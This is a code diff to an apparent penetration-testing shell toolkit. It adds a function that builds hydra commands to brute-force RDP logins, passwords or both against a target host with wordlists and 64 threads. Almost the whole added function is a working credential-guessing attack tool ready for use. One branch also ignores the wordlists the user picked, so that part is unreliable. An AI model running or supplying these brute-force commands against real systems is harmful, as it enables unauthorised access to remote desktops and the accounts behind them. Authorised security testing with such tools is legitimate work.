@@ -13,6 +13,7 @@ The nb-enum-rdp namespace contains commands for scanning and enumerating RDP rem
 Commands
 --------
 nb-enum-rdp-install                  installs dependencies
+nb-enum-rdp-hydra                    brute force with hydra
 nb-enum-rdp-nmap-sweep               scan a network for services
 nb-enum-rdp-tcpdump                  capture traffic to and from a host
 nb-enum-rdp-ncrack                   brute force passwords for a user account
@@ -26,6 +27,64 @@ DOC
 nb-enum-rdp-install() {
     __info "Running $0..."
     __pkgs nmap tcpdump ncrack metasploit-framework
+}
+
+nb-enum-rdp-hydra() {
+    __check-project
+    nb-vars-set-rhost
+
+    __ask "You wanna brute force login/password/both? (l/p/b)"
+    local login && __askvar login "LOGIN_OPTION"
+
+    __ask "Is the service running on default port? (y/n)"
+    local df && __askvar df "DEFAULT_PORT"
+
+    if [[ $df == "n" ]]; then
+      __ask "Enter port number"
+      local pn && __askvar pn "PORT_NUMBER"
+    fi
+
+    if [[ $login == "p" ]]; then
+      nb-vars-set-user
+      if [[ $df == "n" ]]; then
+        print -z "hydra -l ${__USER} -P ${__PASSLIST} -s $pn -o $(__hostpath)/rdp-hydra-brute.txt ${__RHOST} rdp -t 64 -F"
+      else
+        print -z "hydra -l ${__USER} -P ${__PASSLIST} -o $(__hostpath)/rdp-hydra-brute.txt ${__RHOST} rdp -t 64 -F"
+      fi
+    elif [[ $login == "l" ]]; then
+      nb-vars-set-wordlist
+      nb-vars-set-pass
+      if [[ $df == "n" ]]; then
+        print -z "hydra -L ${__WORDLIST} -p ${__PASS} -s $pn -o $(__hostpath)/rdp-hydra-brute.txt ${__RHOST} rdp -t 64 -F"
+      else
+        print -z "hydra -L ${__WORDLIST} -p ${__PASS} -o $(__hostpath)/rdp-hydra-brute.txt ${__RHOST} rdp -t 64 -F"
+      fi
+    elif [[ $login == "b" ]]; then
+      __ask "Do you wanna manually specify wordlists? (y/n)"
+      local sw && __askvar sw "SPECIFY_WORDLIST"
+      if [[ $sw == "y" ]]; then
+        __ask "Select a user list"
+        __askpath ul FILE $HOME/desktop/projects/
+        __ask "Select a password list"
+        __askpath pl FILE $HOME/desktop/projects/
+
+        if [[ $df == "n" ]]; then
+          print -z "hydra -L $ul -P $pl -s $pn -o $(__hostpath)/rdp-hydra-brute.txt ${__RHOST} rdp -t 64 -F"
+        else
+          print -z "hydra -L ${__WORDLIST} -P ${__PASSLIST} -o $(__hostpath)/rdp-hydra-brute.txt ${__RHOST} rdp -t 64 -F"
+        fi
+      else
+        nb-vars-set-wordlist
+        if [[ $df == "n" ]]; then
+          print -z "hydra -L ${__WORDLIST} -P ${__PASSLIST} -s $pn -o $(__hostpath)/rdp-hydra-brute.txt ${__RHOST} rdp -t 64 -F"
+        else
+          print -z "hydra -L ${__WORDLIST} -P ${__PASSLIST} -o $(__hostpath)/rdp-hydra-brute.txt ${__RHOST} rdp -t 64 -F"
+        fi
+      fi
+    else
+      echo
+      __err "Invalid option. Please choose 'p' for password or 'l' for login or 'b' for both."
+    fi
 }
 
 nb-enum-rdp-nmap-sweep() {
